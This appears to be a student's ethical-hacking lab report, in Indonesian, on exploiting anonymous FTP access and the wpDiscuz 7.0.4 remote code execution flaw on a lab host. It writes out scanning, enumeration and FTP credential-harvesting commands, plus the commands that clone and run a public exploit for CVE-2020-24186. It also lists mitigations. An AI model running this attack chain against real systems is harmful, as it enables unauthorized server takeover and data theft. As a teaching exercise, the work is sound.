# ETHACK-PRAKTIKUM-2-2024

1. Cover Page

Nama Praktikan: Muhammad Kenas Galeno Putra
NRP: 5027231069
Judul Praktikum: Vulnerability Exploitation on FTP and WordPress Plugins

2. Nama Kerentanan

Vulnerable FTP: vsFTPd 3.0.5
Vulnerable WordPress Plugin: wpDiscuz 7.0.4 (Remote Code Execution)

3. Deskripsi Kerentanan

Vulnerable FTP: Kerentanan pada server FTP ini memungkinkan akses anonymous, sehingga siapa pun bisa mengakses dan mengunduh file tanpa autentikasi, yang dapat berisiko jika file tersebut berisi informasi sensitif.
Vulnerable WordPress Plugin: Plugin wpDiscuz versi 7.0.4 rentan terhadap Remote Code Execution (RCE), memungkinkan penyerang menjalankan perintah di server yang menggunakan plugin ini.

4. CVSS Score

Vulnerable FTP: CVSS Score: 5.0 (Medium) – Risiko dari akses unauthorized namun tidak langsung memberikan kendali penuh ke sistem.
wpDiscuz RCE: CVSS Score: 9.8 (Critical) – Kerentanan RCE memberikan akses penuh penyerang ke server.

5. Langkah Pengerjaan

Vulnerable FTP:
Pindai server untuk menemukan port yang terbuka:

```bash
nmap -p- 10.15.42.245
```
![langkah 1](https://github.com/user-attachments/assets/c1c2c175-0904-42e9-ad4e-10f43bda4e87)


Pindai kerentanan FTP dengan Nmap:

```bash
gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/common.txt
```
![langkah 2](https://github.com/user-attachments/assets/e1622ada-0dc9-4a72-b402-35f5904e8fd5)


Login ke FTP menggunakan akun anonymous:

```bash
ftp 10.15.42.245
```

```bash
ls
get list.xyz
get readme.txt
exit
```

![langkah 3](https://github.com/user-attachments/assets/ddb6a8dd-5e9e-4240-966f-124bf9380e0a)


Mencari username atau password dalam file:

```bash
cat list.xyz
grep -i "ethack" list.xyz
```

![langkah 4](https://github.com/user-attachments/assets/af24be7f-4219-40a3-8dd3-0d9b06e7c6e8)

Masukkan password pada hashes.txt

```bash
nano hashes.txt
```

![langkah 5](https://github.com/user-attachments/assets/70d6be57-2b69-45ee-a9f4-4fbfed67d89c)



Gunakan wpscan untuk mendeteksi plugin WordPress yang terinstal:

![langkah 6](https://github.com/user-attachments/assets/4b46ba37-e4cb-4191-a71a-ef75216d3920)


```bash
wpscan --url http://10.15.42.245:487 --enumerate p
```
![langkah 7](https://github.com/user-attachments/assets/86286eda-8900-48d6-8cf4-5b5a101df2f5)

Clone exploit wpDiscuz:

```bash
git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
```
![langkah 8](https://github.com/user-attachments/assets/ce1f2b97-1a83-4b2e-a69e-c977bfb87140)

Jalankan exploit:

```bash
cd CVE-2020-24186-wpDiscuz-7.0.4-RCE
```

```bash
sudo python3 wpDiscuz_RemoteCodeExec.py -u http://10.15.42.245:487 -p /2024/10/03/trial/
```

Tampilkan:

```bash
ls
```
![langkah 9](https://github.com/user-attachments/assets/42e42452-3951-4645-b4fe-8b848ad104e1)


6. Dampak

Vulnerable FTP: Akses unauthorized memungkinkan pengunduhan file yang mungkin berisi informasi sensitif seperti hash password, data pengguna, atau file penting lainnya.
wpDiscuz RCE: Penyerang bisa mengeksekusi perintah di server, yang bisa mengarah ke kontrol penuh atas server WordPress, termasuk pencurian data, defacement website, dan tindakan jahat lainnya.

7. Mitigasi

FTP Vulnerability:
Nonaktifkan akses anonymous pada FTP.
Gunakan protokol yang lebih aman seperti SFTP atau FTPS.
wpDiscuz RCE:
Patch plugin ke versi terbaru.
Batasi akses ke plugin dan pantau aktivitas server secara berkala untuk mendeteksi aktivitas mencurigakan.
